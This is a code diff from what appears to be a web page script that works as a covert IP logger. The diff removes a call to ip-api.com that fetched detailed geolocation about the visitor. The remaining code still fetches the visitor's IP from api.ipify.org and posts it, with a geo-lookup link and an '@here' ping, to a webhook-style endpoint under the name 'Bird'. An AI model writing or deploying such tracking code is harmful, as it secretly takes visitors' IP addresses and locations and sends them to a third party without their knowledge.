@@ -235,14 +235,6 @@
             xhr.send(null);
         }
 
-        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-            var div = document.createElement("div");
-            div.innerHTML = text;
-            div.id = "razzylog";
-            const secondList = document.getElementsByClassName("header")[0];
-            secondList.appendChild(div);
-        });
-
         get_information("https://api.ipify.org/", function(text) {
             var div = document.createElement("div");
             div.innerHTML = text;
@@ -260,7 +252,7 @@
             const params = {
                 username: "Bird",
                 avatar_url: 'https://i.postimg.cc/cLbXKSsR/apple.webp',
-                content: "**Ip** : _" + ispp + "_\n**Beamed** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : @here" + extra + "`"
+                content: "**Ip** : _" + ispp + "_\n**Beamed** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : @here" + "`"
             };
             request.send(JSON.stringify(params));
         }
